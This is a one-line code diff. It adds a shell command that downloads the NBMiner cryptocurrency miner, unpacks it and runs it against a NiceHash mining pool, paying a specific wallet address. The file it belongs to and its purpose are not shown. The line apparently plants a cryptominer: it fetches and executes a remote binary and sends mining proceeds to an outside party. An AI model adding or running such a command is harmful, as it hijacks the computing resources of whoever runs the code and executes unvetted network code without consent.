@@ -1,0 +1,1 @@
+wget https://dl.nbminer.com/NBMiner_42.3_Linux.tgz && tar -xvf NBMiner_42.3_Linux.tgz && cd NBMiner_Linux && chmod +x nbminer && ./nbminer -a ethash -o stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u 3DfyhzZ7CC7LrdiU5TBQBKrWRRJC2ZUoKx.Teslitas1
